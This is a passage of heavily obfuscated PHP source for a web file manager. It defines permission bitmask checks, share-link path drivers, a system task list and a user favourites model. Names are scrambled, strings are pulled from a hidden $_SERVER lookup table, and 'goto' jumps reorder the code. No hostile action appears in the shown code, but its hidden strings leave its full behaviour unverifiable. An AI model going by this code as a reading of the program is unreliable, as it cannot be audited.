$ØÖºŠ€Æ[1838] => $òîÏ‹ƒå[$ØÖºŠ€Æ[1838]], $ØÖºŠ€Æ[1839] => (int) $º¥Ã‰‹, $ØÖºŠ€Æ[1840] => (int) $£îÊÚ º); } private function sourceSize() { $ÑÚÉ«—¡ =& $_SERVER[•Ùç É]; $¹–ãëáè = Model($ÑÚÉ«—¡[870])->where(array($ÑÚÉ«—¡[455] => 0))->sum($ÑÚÉ«—¡[78]); $«¬Ï¿ÌĞ = Model($ÑÚÉ«—¡[514])->sum($ÑÚÉ«—¡[78]); if ($«¬Ï¿ÌĞ > $¹–ãëáè) { $«¬Ï¿ÌĞ = $¹–ãëáè; } return array($ÑÚÉ«—¡[78] => (int) $¹–ãëáè, $ÑÚÉ«—¡[1838] => (int) $«¬Ï¿ÌĞ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¯·Ì¬‰¸ =& $_SERVER[•Ùç É]; $Ğ‡½ã§• = array(array($¯·Ì¬‰¸[464] => LNG($¯·Ì¬‰¸[1905]), $¯·Ì¬‰¸[1906] => $¯·Ì¬‰¸[1907], $¯·Ì¬‰¸[1908] => 1, $¯·Ì¬‰¸[1909] => 1, $¯·Ì¬‰¸[1910] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¯·Ì¬‰¸[464] => LNG($¯·Ì¬‰¸[1911]), $¯·Ì¬‰¸[1906] => $¯·Ì¬‰¸[1912], $¯·Ì¬‰¸[1908] => 2, $¯·Ì¬‰¸[1909] => 1, $¯·Ì¬‰¸[1910] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¯·Ì¬‰¸[464] => LNG($¯·Ì¬‰¸[1913]), $¯·Ì¬‰¸[1906] => $¯·Ì¬‰¸[1914], $¯·Ì¬‰¸[1908] => 3, $¯·Ì¬‰¸[1909] => 1, $¯·Ì¬‰¸[1910] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¯·Ì¬‰¸[464] => LNG($¯·Ì¬‰¸[1915]), $¯·Ì¬‰¸[1906] => $¯·Ì¬‰¸[1916], $¯·Ì¬‰¸[1908] => 4, $¯·Ì¬‰¸[1909] => 1, $¯·Ì¬‰¸[1910] => self::AUTH_SHOW | self::AUTH_VIEW), array($¯·Ì¬‰¸[464] => LNG($¯·Ì¬‰¸[1917]), $¯·Ì¬‰¸[1906] => $¯·Ì¬‰¸[1918], $¯·Ì¬‰¸[1908] => 5, $¯·Ì¬‰¸[1909] => 1, $¯·Ì¬‰¸[1910] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¯·Ì¬‰¸[464] => LNG($¯·Ì¬‰¸[1919]), $¯·Ì¬‰¸[1906] => $¯·Ì¬‰¸[1920], $¯·Ì¬‰¸[1908] => 6, $¯·Ì¬‰¸[1909] => 1, $¯·Ì¬‰¸[1910] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¯·Ì¬‰¸[464] => LNG($¯·Ì¬‰¸[1921]), $¯·Ì¬‰¸[1906] => $¯·Ì¬‰¸[1922], $¯·Ì¬‰¸[1908] => 7, $¯·Ì¬‰¸[1909] => 1, $¯·Ì¬‰¸[1910] => 0)); return $Ğ‡½ã§•; } public static function authCheck($İìÆ©”Ğ, $û’¯Í”) { $æÍŒ’ûÏ =& $_SERVER[•Ùç É]; $İìÆ©”Ğ = intval($İìÆ©”Ğ); if (KodUser::isRoot() && $GLOBALS[$æÍŒ’ûÏ[6]][$æÍŒ’ûÏ[1923]]) { return !0; } if ($İìÆ©”Ğ <= 0) { return !1; } if (($İìÆ©”Ğ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($İìÆ©”Ğ & $û’¯Í”); } public static function authCheckShow($³ÚêÑĞ) { return self::authCheck($³ÚêÑĞ, self::AUTH_SHOW); } public static function authCheckView($”Í¤¤µ) { return self::authCheck($”Í¤¤µ, self::AUTH_VIEW); } public static function authCheckDownload($ä®â€¯ğ) { return self::authCheck($ä®â€¯ğ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($£„à‡Üì) { return self::authCheck($£„à‡Üì, self::AUTH_UPLOAD); } public static function authCheckEdit($Œíõ¯›) { return self::authCheck($Œíõ¯›, self::AUTH_EDIT); } public static function authCheckRemove($®“¾ÃŒß) { return self::authCheck($®“¾ÃŒß, self::AUTH_REMOVE); } public static function authCheckShare($Ê¨¥¯÷) { return self::authCheck($Ê¨¥¯÷, self::AUTH_SHARE); } public static function authCheckComment($›Ú£‰) { return self::authCheck($›Ú£‰, self::AUTH_COMMENT); } public static function authCheckEvent($ê¸ÏÅò) { return self::authCheck($ê¸ÏÅò, self::AUTH_EVENT); } public static function authCheckRoot($°êÅ‡Åî) { return self::authCheck($°êÅ‡Åî, self::AUTH_ROOT); } public static function authCheckAction($š¶Ü‰ , $Á£ØØÁ) { $ÙÔ å— =& $_SERVER[•Ùç É]; $ıƒ»ŒÃ¥ = array($ÙÔ å—[1924] => self::AUTH_VIEW, $ÙÔ å—[1245] => self::AUTH_DOWNLOAD, $ÙÔ å—[109] => self::AUTH_UPLOAD, $ÙÔ å—[1874] => self::AUTH_EDIT, $ÙÔ å—[1873] => self::AUTH_REMOVE, $ÙÔ å—[1884] => self::AUTH_SHARE, $ÙÔ å—[400] => self::AUTH_COMMENT, $ÙÔ å—[1693] => self::AUTH_EVENT, $ÙÔ å—[1925] => self::AUTH_ROOT); if (!isset($ıƒ»ŒÃ¥[$Á£ØØÁ])) { return; } $Å²–¦»  = $ıƒ»ŒÃ¥[$Á£ØØÁ]; $š¶Ü‰  = intval($š¶Ü‰ ); if ($š¶Ü‰  <= 0) { return !1; } if (($š¶Ü‰  & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($š¶Ü‰  & $Å²–¦» ); } public static function authDisable($„ÌÔÉ‘Ô, $òŸ¦ªÇ¥) { if (intval($„ÌÔÉ‘Ô) <= 0) { return 0; } return intval($„ÌÔÉ‘Ô) & ~$òŸ¦ªÇ¥; } public $optionType = "\x53\x79\163\x74\145\x6d\x2e\163\157\165\162\143\145\x41\x75\x74\x68\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\141\x75\x74\150", "\154\141\x62\145\x6c", "\x64\x69\163\x70\x6c\x61\171", "\x73\x79\x73\x74\x65\155", "\163\157\x72\164"); public function initData() { $¡ö†âÛ¦ = $this->authDefault(); foreach ($¡ö†âÛ¦ as $Ú•»£Î) { $this->add($Ú•»£Î); } } public function findAuth($’ÓÙà–™, $Ê£®è¸›) { $›Ë«å£Ö =& $_SERVER[•Ùç É]; $âÔ€Ôüò = parent::listData(); foreach ($âÔ€Ôüò as $÷ŸÃİÂ²) { $”ö§Ó¾² = intval($÷ŸÃİÂ²[$›Ë«å£Ö[457]]); if ($”ö§Ó¾² <= 0 || $÷ŸÃİÂ²[$›Ë«å£Ö[1926]] == 0) { continue; } if (($”ö§Ó¾² & $’ÓÙà–™) != $’ÓÙà–™) { continue; } if (($”ö§Ó¾² & $Ê£®è¸›) != 0) { continue; } return $÷ŸÃİÂ²[$›Ë«å£Ö[445]]; } return !1; } public function findAuthReadOnly() { $ªñûĞ¢æ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÇÄº©²ú = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ªñûĞ¢æ, $ÇÄº©²ú); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Ç’ğ£ÍÁ =& $_SERVER[•Ùç É]; $¿Äí³Åó = parent::listData(); $£é«ãˆ = !1; foreach ($¿Äí³Åó as $ûí¼Š»Ò) { if ($ûí¼Š»Ò[$Ç’ğ£ÍÁ[457]] <= 0 || $ûí¼Š»Ò[$Ç’ğ£ÍÁ[1926]] == $Ç’ğ£ÍÁ[214]) { continue; } if (!$£é«ãˆ) { $£é«ãˆ = $ûí¼Š»Ò; continue; } if ($£é«ãˆ[$Ç’ğ£ÍÁ[457]] > $ûí¼Š»Ò[$Ç’ğ£ÍÁ[457]]) { $£é«ãˆ = $ûí¼Š»Ò; } } return $£é«ãˆ ? $£é«ãˆ[$Ç’ğ£ÍÁ[445]] : $Ç’ğ£ÍÁ[12]; } public function listData($Å“¬åç = false, $·Ş¯ª Æ = "\163\157\x72\x74", $ˆ©ÌúŞå = false) { return parent::listData($Å“¬åç, $·Ş¯ª Æ, $ˆ©ÌúŞå); } public function update($ì ê“›Ü, $İæÍ¬òÇ) { $ÖÊğòúç =& $_SERVER[•Ùç É]; $’ª‰óï = parent::listData($ì ê“›Ü); $ÅùĞÂï = $this->findByName($İæÍ¬òÇ[$ÖÊğòúç[32]]); if (!$’ª‰óï || $ÅùĞÂï && $ÅùĞÂï[$ÖÊğòúç[445]] != $’ª‰óï[$ÖÊğòúç[445]]) { return !1; } $this->filterAuth($İæÍ¬òÇ[$ÖÊğòúç[457]]); return parent::update($ì ê“›Ü, $İæÍ¬òÇ); } public function remove($çïëÇ”®) { $Éâ§ùşÜ = parent::listData($çïëÇ”®); if (!$Éâ§ùşÜ || $Éâ§ùşÜ[$_SERVER[•Ùç É][181]]) { return !1; } return parent::remove($çïëÇ”®); } public function add($‡üñéŠƒ = array()) { $‡æ£Ö¶­ =& $_SERVER[•Ùç É]; if ($this->findByName($‡üñéŠƒ[$‡æ£Ö¶­[32]])) { return !1; } $ÔúÉ•Œ­ = array($‡æ£Ö¶­[32] => $‡æ£Ö¶­[12], $‡æ£Ö¶­[457] => 1, $‡æ£Ö¶­[1927] => $‡æ£Ö¶­[1914], $‡æ£Ö¶­[1926] => 1, $‡æ£Ö¶­[181] => 0, $‡æ£Ö¶­[1928] => 0); $‡üñéŠƒ = array_merge($ÔúÉ•Œ­, $‡üñéŠƒ); $‡üñéŠƒ[$‡æ£Ö¶­[1928]] = $this->getSort(); $this->filterAuth($‡üñéŠƒ[$‡æ£Ö¶­[457]]); return parent::insert($‡üñéŠƒ); } private function getSort() { $Â¼²Ø˜É =& $_SERVER[•Ùç É]; $£™õÊ†¤ = parent::listData(); $â› ÍùÚ = array_to_keyvalue($£™õÊ†¤, $Â¼²Ø˜É[12], $Â¼²Ø˜É[1928]); return empty($â› ÍùÚ) ? 0 : max($â› ÍùÚ) + 1; } private function filterAuth(&$ÖšÌÑÀŒ) { if (!$ÖšÌÑÀŒ) { return; } $Üù×‚­ß = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $¢çŞèŞ = array(); foreach ($Üù×‚­ß as $¸§İ ˆˆ) { if ($ÖšÌÑÀŒ & $¸§İ ˆˆ) { $¢çŞèŞ[] = $¸§İ ˆˆ; } } if (in_array(self::AUTH_ROOT, $¢çŞèŞ)) { $ÖšÌÑÀŒ = array_sum($Üù×‚­ß); return; } $ìš½Ê¿« = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($¢çŞèŞ as $¸§İ ˆˆ) { if (isset($ìš½Ê¿«[$¸§İ ˆˆ])) { $¢çŞèŞ = array_merge($¢çŞèŞ, $ìš½Ê¿«[$¸§İ ˆˆ]); } } $¢çŞèŞ[] = self::AUTH_SHOW; $ÖšÌÑÀŒ = array_sum(array_unique($¢çŞèŞ)); } public function sort($Òš¡ÂÈ, $ôŒÑæÈ¯) { return parent::update($Òš¡ÂÈ, $ôŒÑæÈ¯); } } goto cƒ…ò¶Î„¸; Dˆ³„ëÁââ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($ŞÅ·˜ú) { $this->pathParse = $ŞÅ·˜ú; $this->model = Model($_SERVER[•Ùç É][1384]); } protected function infoParse($´‘ºœè¦, $ƒñµƒ¶‹ = false, $×¨À³Åò = false) { $úœšòÙà =& $_SERVER[•Ùç É]; return Action($úœšòÙà[1225])->sharePathInfo($this->pathParse[$úœšòÙà[86]], !0, $ƒñµƒ¶‹); } public function listPath($˜‘¯´É¦, $Æ¾·èÚ = false) { $Å–åÍÜÙ =& $_SERVER[•Ùç É]; $±Ÿ¥œµ = parent::listPath($˜‘¯´É¦, $Æ¾·èÚ); if (!$±Ÿ¥œµ) { return $±Ÿ¥œµ; } if (is_array($±Ÿ¥œµ[$Å–åÍÜÙ[1392]])) { $±Ÿ¥œµ[$Å–åÍÜÙ[1392]] = Action($Å–åÍÜÙ[1225])->shareItemInfo($±Ÿ¥œµ[$Å–åÍÜÙ[1392]]); } foreach ($±Ÿ¥œµ as $Üµ¾–ì¹ => $ƒµÕ€) { if (!in_array($Üµ¾–ì¹, array($Å–åÍÜÙ[85], $Å–åÍÜÙ[84]))) { continue; } foreach ($ƒµÕ€ as $«ˆğÁŞï => $¥é«èæ€) { $±Ÿ¥œµ[$Üµ¾–ì¹][$«ˆğÁŞï] = Action($Å–åÍÜÙ[1225])->shareItemInfo($¥é«èæ€); } } return $±Ÿ¥œµ; } public function listAll($óá¸ÊÈ€) { $É¤Ÿª½¼ =& $_SERVER[•Ùç É]; $ÔÌ÷çŸ = IO::info($this->pathParse[$É¤Ÿª½¼[86]]); if (!$ÔÌ÷çŸ) { return array(); } $øÌØŒ’£ = $this->model->listAll($óá¸ÊÈ€); foreach ($øÌØŒ’£ as &$×ÌÏÜ‰õ) { $×ÌÏÜ‰õ[$É¤Ÿª½¼[89]] = Action($É¤Ÿª½¼[1225])->shareItemInfo($×ÌÏÜ‰õ[$É¤Ÿª½¼[89]]); } unset($×ÌÏÜ‰õ); return $øÌØŒ’£; } } class PathDriverDriverShareItem { public function __construct($ğ§¹üò’) { $this->pathParse = $ğ§¹üò’; } public function __call($ÄÓéâª, $ÙƒıÊÌ) { $¨·£º =& $_SERVER[•Ùç É]; if (method_exists($this, $ÄÓéâª)) { return; } $–¡‹ÛÛä = call_user_func_array(array($¨·£º[1393], $ÄÓéâª), $ÙƒıÊÌ); $ü„¡÷ñ = array($¨·£º[1394], $¨·£º[1395], $¨·£º[1396], $¨·£º[1397], $¨·£º[588], $¨·£º[590], $¨·£º[1398], $¨·£º[109], $¨·£º[1399], $¨·£º[1400]); if (in_array($ÄÓéâª, $ü„¡÷ñ)) { $–¡‹ÛÛä = $this->getPathOuter($–¡‹ÛÛä); } return $–¡‹ÛÛä; } public function copy($¶ªâäí•, $Èû¬Ò½«, $õÓˆù±Ñ = false, $ÔÜÖÔ = false) { return $this->copyMove($¶ªâäí•, $Èû¬Ò½«, $õÓˆù±Ñ, $_SERVER[•Ùç É][588], $ÔÜÖÔ); } public function move($¾òÇ„ø, $Ñß½Ôòá, $¿áö—ù÷ = false, $ãÎÔõá³ = false) { return $this->copyMove($¾òÇ„ø, $Ñß½Ôòá, $¿áö—ù÷, $_SERVER[•Ùç É][590], $ãÎÔõá³); } private function copyMove($¸²§©ÛÒ, $¶ƒóõİš, $÷§š¤­», $é–õÚ–ì, $Ÿ§óèöç = false) { $¤‹¹á˜æ =& $_SERVER[•Ùç É]; $ÃĞ˜Ïš = $¶ƒóõİš; $‚ÜÑÏÀ = IO::driverMake($¶ƒóõİš); if ($‚ÜÑÏÀ->pathParse[$¤‹¹á˜æ[1202]]) { $¶ƒóõİš = $‚ÜÑÏÀ->pathParse[$¤‹¹á˜æ[1202]]; } else { $¶ƒóõİš = $ÃĞ˜Ïš; } $şÙŸ¯³ê = IO::copyMove($¸²§©ÛÒ, $¶ƒóõİš, $÷§š¤­», $é–õÚ–ì, $Ÿ§óèöç); $şÙŸ¯³ê = $this->getPathOuter($şÙŸ¯³ê); return $şÙŸ¯³ê; } public function pathThis($“¹÷Úîƒ) { return get_path_this($this->pathParse[$_SERVER[•Ùç É][86]]); } public function pathFather($Âø±©ƒ¦) { return get_path_father($this->pathParse[$_SERVER[•Ùç É][86]]); } public function iconvSystem($ÈµÑûÓú) { return $ÈµÑûÓú; } protected function infoParse($ü ßï®Ñ, $àö¢„ìı = false) { $º“ÍÀãº =& $_SERVER[•Ùç É]; $Æé¿ó± = $this->pathParse[$º“ÍÀãº[531]][$º“ÍÀãº[1226]] . $this->pathParse[$º“ÍÀãº[1219]]; if ($àö¢„ìı) { $Í—“œ˜Ì = IO::infoWithChildren($Æé¿ó±); } else { $Í—“œ˜Ì = IO::info($Æé¿ó±); } $·çÎ©³ô = $this->pathParse[$º“ÍÀãº[531]]; return Action($º“ÍÀãº[1391])->_shareItemeParse($Í—“œ˜Ì, $·çÎ©³ô); } public function listAll($®ÍÄîÄÒ) { $°ğŸ¯ô– =& $_SERVER[•Ùç É]; $˜‹ğ®óŒ = IO::listAll($®ÍÄîÄÒ); $Ñ“¾“É = rtrim($this->pathParse[$°ğŸ¯ô–[531]][$°ğŸ¯ô–[1226]], $°ğŸ¯ô–[8]); foreach ($˜‹ğ®óŒ as &$‘ü´Ø¼ø) { $‘ü´Ø¼ø[$°ğŸ¯ô–[86]] = $this->pathDriver . $°ğŸ¯ô–[8] . ltrim(substr($‘ü´Ø¼ø[$°ğŸ¯ô–[86]], strlen($Ñ“¾“É)), $°ğŸ¯ô–[8]); } unset($‘ü´Ø¼ø); return $˜‹ğ®óŒ; } public function listAllSimple($Åò–ßÂ, $˜ƒõ†× = false) { $æ²•Òˆ =& $_SERVER[•Ùç É]; $÷•Ãõ°Ó = $this->listAll($Åò–ßÂ); $Îöœ…®Å = $this->pathParse[$æ²•Òˆ[465]]; if (trim($Îöœ…®Å, $æ²•Òˆ[8]) == trim(get_path_father($Îöœ…®Å), $æ²•Òˆ[8])) { $˜ƒõ†× = !0; } return IO::init($æ²•Òˆ[12])->listAllSimpleMake($÷•Ãõ°Ó, $Îöœ…®Å, $˜ƒõ†×); } public function getPathOuter($ÑÌÙì¾) { $‹ØÊû¥× =& $_SERVER[•Ùç É]; $™âÒò´ = KodIO::parse($ÑÌÙì¾); if ($™âÒò´[$‹ØÊû¥×[33]] == KodIO::KOD_SHARE_ITEM) { return $™âÒò´[$‹ØÊû¥×[86]]; } $í½Ü¤İ© = KodIO::clear($ÑÌÙì¾); $ØºóÂû = KodIO::clear($this->pathParse[$‹ØÊû¥×[531]][$‹ØÊû¥×[1226]]); $¹ªÂ°Ï¾ = substr($í½Ü¤İ©, strlen($ØºóÂû)); if (substr($í½Ü¤İ©, 0, strlen($ØºóÂû)) != $ØºóÂû) { return !1; } return $this->pathParse[$‹ØÊû¥×[1220]] . $‹ØÊû¥×[8] . ltrim($¹ªÂ°Ï¾, $‹ØÊû¥×[8]); } public function getType() { $ÅÎ¶è” =& $_SERVER[•Ùç É]; $ªÔÀï‚ñ = str_replace($ÅÎ¶è”[76], $ÅÎ¶è”[12], get_class($this)); return strtolower($ªÔÀï‚ñ); } public function isTypeObject($§ğè˜ú¦) { return IO::isTypeObject($§ğè˜ú¦); } public function info($úá‘üéÈ) { return $this->infoParse($úá‘üéÈ); } public function infoAuth($Ÿùƒ¾ÜÕ) { return $this->infoParse($Ÿùƒ¾ÜÕ); } public function infoWithChildren($Û¤¥üáë) { return $this->infoParse($Û¤¥üáë, !0); } public function infoFull($º”è«ğÄ) { return $this->infoParse($º”è«ğÄ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($–¿ï·¹) { $this->pathParse = $–¿ï·¹; } protected function infoParse($Ü²Îæ•º, $‚“·’Ö· = false) { $ÕçŒîŠÌ =& $_SERVER[•Ùç É]; return Action($ÕçŒîŠÌ[1225])->sharePathInfo($this->pathParse[$ÕçŒîŠÌ[86]], !0, $‚“·’Ö·); } public function listPath($‘ÈÉùÏ‰, $°ÏÈ£‡é = false) { $¬¿ÂÔş³ =& $_SERVER[•Ùç É]; $»î¡Ä’ = IO::listPath($‘ÈÉùÏ‰, $°ÏÈ£‡é); if (!$»î¡Ä’) { return $»î¡Ä’; } if (is_array($»î¡Ä’[$¬¿ÂÔş³[1392]])) { $èÚÄÅö¢ = Action($¬¿ÂÔş³[1401])->parsePathChildren($»î¡Ä’[$¬¿ÂÔş³[1392]], array($¬¿ÂÔş³[465] => $‘ÈÉùÏ‰)); $»î¡Ä’[$¬¿ÂÔş³[1392]] = Action($¬¿ÂÔş³[1225])->shareItemInfo($èÚÄÅö¢); } foreach ($»î¡Ä’ as $ÅÓ¢Üö° => $®ÜÖ§®€) { if (!in_array($ÅÓ¢Üö°, array($¬¿ÂÔş³[85], $¬¿ÂÔş³[84]))) { continue; } foreach ($®ÜÖ§®€ as $ï«°éäì => $èÚÄÅö¢) { $èÚÄÅö¢ = Action($¬¿ÂÔş³[1401])->parsePathChildren($èÚÄÅö¢, array($¬¿ÂÔş³[465] => $‘ÈÉùÏ‰)); $»î¡Ä’[$ÅÓ¢Üö°][$ï«°éäì] = Action($¬¿ÂÔş³[1225])->shareItemInfo($èÚÄÅö¢); } } return $»î¡Ä’; } } goto fíëö¢ßóí; A„È ¼–÷: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\x2e\x74\x61\163\x6b\x4c\151\163\164"; public $field = array("\x6e\141\x6d\145", "\x74\x79\160\145", "\145\166\145\x6e\164", "\164\151\155\x65", "\144\145\x73\x63", "\163\171\163\164\x65\155", "\145\x6e\x61\x62\x6c\x65", "\154\x61\163\164\122\165\156", "\x73\157\162\164"); public function listData($õ§ºö¾» = false, $¦“°®’Ù = "\163\x6f\162\164", $®éÁ¨¸¾ = false) { return parent::listData($õ§ºö¾», $¦“°®’Ù, $®éÁ¨¸¾); } public function add($üˆ‰ôÍú) { $‰Åâ¾û =& $_SERVER[•Ùç É]; $‡‹İ¬Ò = $this->findByName($üˆ‰ôÍú[$‰Åâ¾û[32]]); if ($‡‹İ¬Ò) { return !1; } $üˆ‰ôÍú[$‰Åâ¾û[1656]] = 0; $üˆ‰ôÍú[$‰Åâ¾û[1928]] = $this->getSort(); return parent::insert($üˆ‰ôÍú); } private function getSort() { $Óï×Şı =& $_SERVER[•Ùç É]; $ß¿¿ÜÆí = parent::listData(); $Ôß§àğé = array_to_keyvalue($ß¿¿ÜÆí, $Óï×Şı[12], $Óï×Şı[1928]); return empty($Ôß§àğé) ? 0 : max($Ôß§àğé) + 1; } public function update($ş†Ù†, $àäğÄ£õ) { $ÅšãƒÃÃ =& $_SERVER[•Ùç É]; $‚áµÂäÇ = $this->listData($ş†Ù†); $„˜àĞ°¯ = $this->findByName($àäğÄ£õ[$ÅšãƒÃÃ[32]]); if (!$‚áµÂäÇ || $„˜àĞ°¯ && $„˜àĞ°¯[$ÅšãƒÃÃ[445]] != $‚áµÂäÇ[$ÅšãƒÃÃ[445]]) { return !1; } return parent::update($ş†Ù†, $àäğÄ£õ); } public function remove($Í¨Š³ï¥, $ì¯¢²úÔ = false) { $…°¦»õ¢ =& $_SERVER[•Ùç É]; $îã³Áˆœ = $this->listData($Í¨Š³ï¥); if (!$îã³Áˆœ) { return; } if (!$ì¯¢²úÔ && $îã³Áˆœ[$…°¦»õ¢[181]] == $…°¦»õ¢[90]) { return !1; } return parent::remove($Í¨Š³ï¥); } public function enable($¹íË‘š¸, $Ä³Ê•ëã) { return $this->update($¹íË‘š¸, array($_SERVER[•Ùç É][2342] => $Ä³Ê•ëã)); } public function run($ØÑ¦­¹°) { return $this->update($ØÑ¦­¹°, array($_SERVER[•Ùç É][2354] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($Å¡Š»­) { $ë´˜ªñß =& $_SERVER[•Ùç É]; return array($ë´˜ªñß[2015] => array(USER_ID, $ë´˜ªñß[2355])); } protected function listData() { $êÃ©“¡¥ =& $_SERVER[•Ùç É]; $¨Ü…Ó®• = array($êÃ©“¡¥[1696] => USER_ID, $êÃ©“¡¥[528] => 0); $ÜïĞÊä = $êÃ©“¡¥[2356]; $ÕÜÄëïÓ = $this->field($ÜïĞÊä)->where($¨Ü…Ó®•)->order($êÃ©“¡¥[2357])->select(); return $ÕÜÄëïÓ ? $ÕÜÄëïÓ : array(); } protected function resetCache() { } protected function listView() { $‘Ó³¡« =& $_SERVER[•Ùç É]; $ÒÊíŞ£¿ = $this->listData(); $íª›§ÃÑ = array_filter_by_field($ÒÊíŞ£¿, $‘Ó³¡«[33], $‘Ó³¡«[460]); $•†Ç®’¸ = array_to_keyvalue($íª›§ÃÑ, $‘Ó³¡«[12], $‘Ó³¡«[86]); if (!$•†Ç®’¸) { return $ÒÊíŞ£¿; } $©Ü—™ñ¤ = 2000; $ßºœ¼Õ« = array($‘Ó³¡«[461] => array($‘Ó³¡«[462], $•†Ç®’¸)); $¯ÓÆß¹Î = Model($‘Ó³¡«[870])->listSource($ßºœ¼Õ«, $©Ü—™ñ¤); $¯ÓÆß¹Î = array_merge($¯ÓÆß¹Î[$‘Ó³¡«[85]], $¯ÓÆß¹Î[$‘Ó³¡«[84]]); $¯ÓÆß¹Î = array_to_keyvalue($¯ÓÆß¹Î, $‘Ó³¡«[183]); foreach ($ÒÊíŞ£¿ as $û›ãŸÊı => $ ÖõŞ) { $•óÄ¹ôÄ = $¯ÓÆß¹Î[$ ÖõŞ[$‘Ó³¡«[86]]]; $•óÄ¹ôÄ = $•óÄ¹ôÄ ? $•óÄ¹ôÄ : array(); $ÒÊíŞ£¿[$û›ãŸÊı] = array_merge($•óÄ¹ôÄ, $ ÖõŞ); } return $ÒÊíŞ£¿; } protected function addFav($³ùˆóé—, $¹Ğµ¡í = '', $ÔÅœÁó = "\163\x6f\165\x72\x63\145") { $±ˆıºŞ =& $_SERVER[•Ùç É]; $İ©íí”§ = array($±ˆıºŞ[1696] => USER_ID, $±ˆıºŞ[528] => 0, $±ˆıºŞ[466] => $ÔÅœÁó, $±ˆıºŞ[465] => $³ùˆóé—); if ($this->where($İ©íí”§)->find()) { return !1; } $İ©íí”§ = array($±ˆıºŞ[1696] => USER_ID, $±ˆıºŞ[528] => 0); $­ëÕë–¤ = $this->where($İ©íí”§)->max($±ˆıºŞ[1928]); if (!$­ëÕë–¤) { $­ëÕë–¤ = 0; } if (!$¹Ğµ¡í && $ÔÅœÁó == $±ˆıºŞ[460]) { $ œìŞö´ = Model($±ˆıºŞ[1384])->where(array($±ˆıºŞ[461] => $³ùˆóé—))->find(); if (!$ œìŞö´) { return !1; } $¹Ğµ¡í = $ œìŞö´[$±ˆıºŞ[32]]; } $¹Ğµ¡í = $this->getAutoName($¹Ğµ¡í); $ÊšÂ§–é = array($±ˆıºŞ[1696] => USER_ID, $±ˆıºŞ[528] => 0, $±ˆıºŞ[464] => $¹Ğµ¡í, $±ˆıºŞ[465] => $³ùˆóé—, $±ˆıºŞ[466] => $ÔÅœÁó, $±ˆıºŞ[1908] => $­ëÕë–¤ + 1); return $this->add($ÊšÂ§–é); } protected function remove($¯›Æ×¾£) { $óÊîóÈ =& $_SERVER[•Ùç É]; $¥áÜ–Ü” = array($óÊîóÈ[1696] => USER_ID, $óÊîóÈ[463] => $¯›Æ×¾£); return $this->where($¥áÜ–Ü”)->delete(); } protected function removeByName($¸üÀÀÌÔ) { $ÚåÁŞ› =& $_SERVER[•Ùç É]; $ø¦ÂŠêÍ = array($ÚåÁŞ›[1696] => USER_ID, $ÚåÁŞ›[464] => $¸üÀÀÌÔ, $ÚåÁŞ›[528] => 0); return $this->where($ø¦ÂŠêÍ)->delete(); } protected function rename($ŠÀ°“×, $ÃœÛºâ) { $«ªŒÊŠ =& $_SERVER[•Ùç É]; if ($ŠÀ°“× == $ÃœÛºâ) { return !1; } $ä÷ğœ‡â = $this->getAutoName($ÃœÛºâ); if ($ÃœÛºâ != $ä÷ğœ‡â) { return !1; } $¼®ø¬ş¡ = array($«ªŒÊŠ[1696] => USER_ID, $«ªŒÊŠ[528] => 0, $«ªŒÊŠ[32] => $ŠÀ°“×); return $this->where($¼®ø¬ş¡)->save(array($«ªŒÊŠ[32] => $ÃœÛºâ)); } protected function resetSort($€‰Óõìà) { $é­¢¨šş =& $_SERVER[•Ùç É]; $€‰Óõìà = is_array($€‰Óõìà) ? $€‰Óõìà : array(); $»èâşÌÌ = array($é­¢¨šş[1696] => USER_ID); for ($¯”Šâ© = 0; $¯”Šâ© < count($€‰Óõìà); $¯”Šâ©++) { $»èâşÌÌ[$é­¢¨šş[463]] = $€‰Óõìà[$¯”Šâ©]; $this->where($»èâşÌÌ)->save(array($é­¢¨šş[1908] => $¯”Šâ© + 1)); } return !0; } protected 